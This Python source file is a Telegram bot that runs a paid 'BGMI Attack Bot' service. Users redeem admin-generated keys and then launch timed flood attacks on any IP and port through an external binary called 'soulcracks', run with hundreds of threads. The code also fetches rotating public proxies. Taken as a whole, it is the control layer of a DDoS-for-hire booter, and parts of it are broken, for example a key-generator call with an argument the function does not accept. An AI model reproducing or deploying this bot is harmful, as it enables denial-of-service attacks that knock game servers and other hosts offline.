#!python3

import asyncio
import datetime
import itertools
import json
import logging
import os
import random
import string
import time
from ipaddress import ip_address
from typing import Dict, Optional

import aiohttp
import requests
from telegram import Update
from telegram.ext import (ApplicationBuilder, CommandHandler, ContextTypes,
                         MessageHandler, filters)

from config import ADMIN_IDS, BOT_TOKEN, OWNER_USERNAME

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Constants
USER_FILE = "users.json"
KEY_FILE = "keys.json"
DEFAULT_THREADS = 699
MAX_DURATION = 300  # Maximum attack duration in seconds
COOLDOWN_TIME = 240  # Cooldown between attacks for non-admin users
REQUEST_TIMEOUT = 10  # Timeout for HTTP requests

class UserManager:
    def __init__(self):
        self.users: Dict[str, dict] = {}
        self.keys: Dict[str, str] = {}
        self.user_processes: Dict[str, dict] = {}
        self.last_attack_time: Dict[str, float] = {}
        self.load_data()

    def load_data(self) -> None:
        """Load user and key data from files."""
        try:
            if os.path.exists(USER_FILE):
                with open(USER_FILE, "r") as file:
                    self.users = json.load(file)
            if os.path.exists(KEY_FILE):
                with open(KEY_FILE, "r") as file:
                    self.keys = json.load(file)
        except Exception as e:
            logger.error(f"Error loading data: {e}")

    def save_data(self) -> None:
        """Save user and key data to files."""
        try:
            with open(USER_FILE, "w") as file:
                json.dump(self.users, file)
            with open(KEY_FILE, "w") as file:
                json.dump(self.keys, file)
        except Exception as e:
            logger.error(f"Error saving data: {e}")

    def generate_key(self, length: int = 12) -> str:
        """Generate a random key."""
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(length))

    def add_time_to_current_date(self, hours: int = 0, days: int = 0) -> str:
        """Add time to current date and return formatted string."""
        return (datetime.datetime.now() + 
                datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

    def is_user_authorized(self, user_id: str) -> bool:
        """Check if user is authorized and not expired."""
        if user_id not in self.users:
            return False
        expiration = datetime.datetime.strptime(self.users[user_id]['expiration'], '%Y-%m-%d %H:%M:%S')
        return datetime.datetime.now() <= expiration

    def can_user_attack(self, user_id: str) -> tuple[bool, Optional[int]]:
        """Check if user can perform an attack."""
        if user_id in ADMIN_IDS:
            return True, None
        
        current_time = time.time()
        if user_id in self.last_attack_time:
            time_passed = current_time - self.last_attack_time[user_id]
            if time_passed < COOLDOWN_TIME:
                return False, int(COOLDOWN_TIME - time_passed)
        return True, None

class ProxyManager:
    def __init__(self):
        self.proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
        self.proxy_iterator = None
        self.last_fetch_time = 0
        self.fetch_interval = 300  # 5 minutes

    async def get_proxies(self) -> Optional[itertools.cycle]:
        """Fetch and return proxies."""
        current_time = time.time()
        if current_time - self.last_fetch_time < self.fetch_interval:
            return self.proxy_iterator

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.proxy_api_url, timeout=REQUEST_TIMEOUT) as response:
                    if response.status == 200:
                        proxies = (await response.text()).splitlines()
                        if proxies:
                            self.proxy_iterator = itertools.cycle(proxies)
                            self.last_fetch_time = current_time
                            return self.proxy_iterator
        except Exception as e:
            logger.error(f"Error fetching proxies: {e}")
        return None

    async def get_next_proxy(self) -> Optional[dict]:
        """Get next proxy in rotation."""
        if self.proxy_iterator is None:
            self.proxy_iterator = await self.get_proxies()
        
        if self.proxy_iterator:
            proxy = next(self.proxy_iterator)
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        return None

class AttackManager:
    def __init__(self, user_manager: UserManager):
        self.user_manager = user_manager

    def validate_attack_params(self, target_ip: str, port: str, duration: str) -> tuple[bool, str]:
        """Validate attack parameters."""
        try:
            ip_address(target_ip)
            port_num = int(port)
            duration_num = int(duration)

            if not (1 <= port_num <= 65535):
                return False, "Invalid port number (1-65535)"
            if not (1 <= duration_num <= MAX_DURATION):
                return False, f"Duration must be between 1 and {MAX_DURATION} seconds"
            
            return True, ""
        except ValueError:
            return False, "Invalid IP address or numeric parameters"

    def validate_executable(self) -> tuple[bool, str]:
        """Validate that the attack executable exists and is executable."""
        executable_path = './soulcracks'
        if not os.path.exists(executable_path):
            return False, "Attack executable not found"
        if not os.access(executable_path, os.X_OK):
            return False, "Attack executable not executable"
        return True, ""

    async def cleanup_old_processes(self):
        """Clean up completed processes."""
        for user_id in list(self.user_manager.user_processes.keys()):
            process_info = self.user_manager.user_processes[user_id]
            if process_info["process"].returncode is not None:
                del self.user_manager.user_processes[user_id]

    async def start_attack(self, target_ip: str, port: str, duration: str, user_id: str) -> tuple[bool, str]:
        """Start an attack process."""
        # Validate executable
        valid, error_msg = self.validate_executable()
        if not valid:
            return False, error_msg

        # Validate parameters
        valid, error_msg = self.validate_attack_params(target_ip, port, duration)
        if not valid:
            return False, error_msg

        # Check user authorization
        can_attack, cooldown = self.user_manager.can_user_attack(user_id)
        if not can_attack:
            return False, f"Please wait {cooldown} seconds before starting another attack"

        try:
            command = ['./soulcracks', target_ip, port, duration, str(DEFAULT_THREADS)]
            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            self.user_manager.user_processes[user_id] = {
                "process": process,
                "command": command,
                "start_time": time.time()
            }

            if user_id not in ADMIN_IDS:
                self.user_manager.last_attack_time[user_id] = time.time()

            return True, f"Attack started on {target_ip}:{port} for {duration} seconds"
        except Exception as e:
            logger.error(f"Error starting attack: {e}")
            return False, "Error starting attack process"

    async def stop_attack(self, user_id: str) -> tuple[bool, str]:
        """Stop an attack process."""
        if user_id not in self.user_manager.user_processes:
            return False, "No active attack found"

        try:
            process_info = self.user_manager.user_processes[user_id]
            process = process_info["process"]
            if process.returncode is None:
                process.terminate()
                await process.wait()
                del self.user_manager.user_processes[user_id]
                return True, "Attack stopped successfully"
            return False, "Attack already completed"
        except Exception as e:
            logger.error(f"Error stopping attack: {e}")
            return False, "Error stopping attack process"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_text = (
        f"👋 Welcome to BGMI Attack Bot!\n\n"
        f"To get started:\n"
        f"1. Get an access key from an admin\n"
        f"2. Use /redeem <key> to activate your subscription\n"
        f"3. Use /help to see available commands\n\n"
        f"For support, contact {OWNER_USERNAME}"
    )
    await update.message.reply_text(welcome_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "🔥 *Available Commands*\n\n"
        "👤 *User Commands:*\n"
        "/start - Start the bot\n"
        "/status - Check subscription status\n"
        "/redeem <key> - Redeem an access key\n"
        "/bgmi <ip> <port> <duration> - Start attack\n"
        "/stop - Stop current attack\n"
        "/help - Show this message\n\n"
        "👑 *Admin Commands:*\n"
        "/genkey <amount> <hours/days> [custom_key] - Generate key\n"
        "/broadcast <message> - Send message to all users\n\n"
        f"💬 Contact {OWNER_USERNAME} for support"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE, user_manager: UserManager) -> None:
    user_id = str(update.message.from_user.id)
    if not user_manager.is_user_authorized(user_id):
        await update.message.reply_text(
            "❌ No active subscription found\n"
            "Use /redeem <key> to activate your subscription"
        )
        return

    active_attack = user_id in user_manager.user_processes
    expiration = datetime.datetime.strptime(
        user_manager.users[user_id]['expiration'], 
        '%Y-%m-%d %H:%M:%S'
    )
    remaining = expiration - datetime.datetime.now()
    
    status_text = (
        f"📊 *Subscription Status*\n"
        f"Status: Active\n"
        f"Time Remaining: {remaining.days}d {remaining.seconds//3600}h\n"
        f"Active Attack: {'Yes' if active_attack else 'No'}"
    )
    
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE, user_manager: UserManager) -> None:
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem <key>")
        return

    key = context.args[0]
    if key not in user_manager.keys:
        await update.message.reply_text("❌ Invalid or expired key")
        return

    user_id = str(update.message.from_user.id)
    expiration_date = user_manager.keys[key]
    user_manager.users[user_id] = {
        "expiration": expiration_date,
        "username": update.message.from_user.username or "Unknown"
    }
    
    del user_manager.keys[key]
    user_manager.save_data()

    await update.message.reply_text(
        f"✅ Key redeemed successfully!\n"
        f"Access granted until: {expiration_date}"
    )

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE, user_manager: UserManager) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Only admins can generate keys")
        return

    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /genkey <amount> <hours/days> [custom_key]\n\n"
            "Examples:\n"
            "/genkey 24 hours\n"
            "/genkey 7 days\n"
            "/genkey 24 hours CUSTOM123"
        )
        return

    try:
        time_amount = int(context.args[0])
        time_unit = context.args[1].lower()
        custom_key = context.args[2] if len(context.args) > 2 else None

        if time_amount <= 0:
            await update.message.reply_text("Time amount must be positive")
            return

        if time_unit == 'hours':
            expiration_date = user_manager.add_time_to_current_date(hours=time_amount)
        elif time_unit == 'days':
            expiration_date = user_manager.add_time_to_current_date(days=time_amount)
        else:
            await update.message.reply_text("Invalid time unit (use hours/days)")
            return

        key = user_manager.generate_key(custom_key=custom_key)
        user_manager.keys[key] = expiration_date
        user_manager.save_data()

        await update.message.reply_text(
            f"🔑 Key generated:\nKey: `{key}`\n"
            f"Expires: {expiration_date}",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("Invalid number format")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE,
              user_manager: UserManager, attack_manager: AttackManager) -> None:
    user_id = str(update.message.from_user.id)
    
    if not user_manager.is_user_authorized(user_id):
        await update.message.reply_text("❌ Access expired or unauthorized")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    success, message = await attack_manager.start_attack(
        context.args[0], context.args[1], context.args[2], user_id
    )
    await update.message.reply_text(message)

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE,
              user_manager: UserManager, attack_manager: AttackManager) -> None:
    user_id = str(update.message.from_user.id)
    
    if not user_manager.is_user_authorized(user_id):
        await update.message.reply_text("❌ Access expired or unauthorized")
        return

    success, message = await attack_manager.stop_attack(user_id)
    await update.message.reply_text(message)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE,
                   user_manager: UserManager) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Only admins can broadcast messages")
        return

    if not context.args:
        await update.message.reply_text('Usage: /broadcast <message>')
        return

    message = ' '.join(context.args)
    failed_users = []

    for user_id in user_manager.users:
        try:
            await context.bot.send_message(
                chat_id=int(user_id),
                text=f"📢 *Broadcast Message*\n\n{message}",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to send message to {user_id}: {e}")
            failed_users.append(user_id)

    status = "✅ Broadcast completed"
    if failed_users:
        status += f"\n❌ Failed to send to {len(failed_users)} users"
    
    await update.message.reply_text(status)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Update {update} caused error {context.error}")

async def periodic_cleanup(attack_manager: AttackManager):
    while True:
        try:
            await attack_manager.cleanup_old_processes()
            await asyncio.sleep(60)  # Run cleanup every minute
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Error in periodic cleanup: {e}")
            await asyncio.sleep(60)

def register_handlers(app: ApplicationBuilder, user_manager: UserManager, 
                     attack_manager: AttackManager) -> None:
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", 
        lambda u, c: status(u, c, user_manager)))
    app.add_handler(CommandHandler("redeem", 
        lambda u, c: redeem(u, c, user_manager)))
    app.add_handler(CommandHandler("genkey", 
        lambda u, c: genkey(u, c, user_manager)))
    app.add_handler(CommandHandler("bgmi", 
        lambda u, c: bgmi(u, c, user_manager, attack_manager)))
    app.add_handler(CommandHandler("stop", 
        lambda u, c: stop(u, c, user_manager, attack_manager)))
    app.add_handler(CommandHandler("broadcast", 
        lambda u, c: broadcast(u, c, user_manager)))
    app.add_error_handler(error_handler)

async def main():
    try:
        # Initialize components
        user_manager = UserManager()
        attack_manager = AttackManager(user_manager)
        
        # Create application
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        
        # Register handlers
        register_handlers(app, user_manager, attack_manager)
        
        # Start cleanup task
        cleanup_task = asyncio.create_task(periodic_cleanup(attack_manager))
        
        # Start the bot
        await app.initialize()
        await app.start()
        await app.run_polling()
        
        # Cleanup on shutdown
        cleanup_task.cancel()
        await cleanup_task
        await app.stop()
        
    except Exception as e:
        logger.critical(f"Fatal error in main: {e}", exc_info=True)
        raise

if __name__ == '__main__':
    asyncio.run(main())